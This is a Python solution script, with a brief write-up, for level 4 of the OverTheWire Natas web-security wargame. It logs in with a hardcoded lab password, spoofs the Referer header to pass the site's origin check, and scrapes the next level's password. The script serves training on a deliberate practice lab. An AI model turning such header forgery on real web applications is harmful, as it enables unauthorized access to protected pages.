#%%
import requests
import re

name = "natas4"
ref = "natas5"

url = f"http://{name}.natas.labs.overthewire.org/index.php"
refUrl= f"http://{ref}.natas.labs.overthewire.org/"
auth = (f"{name}","Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ")

session = requests.session()
session = requests.Session()
session.headers.update({'referer': refUrl})
logon = session.post(url,auth=auth)
regex = re.compile(r'The password for natas5 is ([\w\d]+)')
try:
    passwd = regex.findall(logon.text)[0]
    print(passwd)
except IndexError:
    print("password not found")
    
"""Natas 4

To solve this one, first I needed to open natas4 in browser, use refersh page button
to see if it's changing the header using tamper plugin for firefox. I saw referer being
added to header with url to natas4. Next step was to reproduce this with python, but this
time I updated header with referer to natas5, after that password showed up.

"""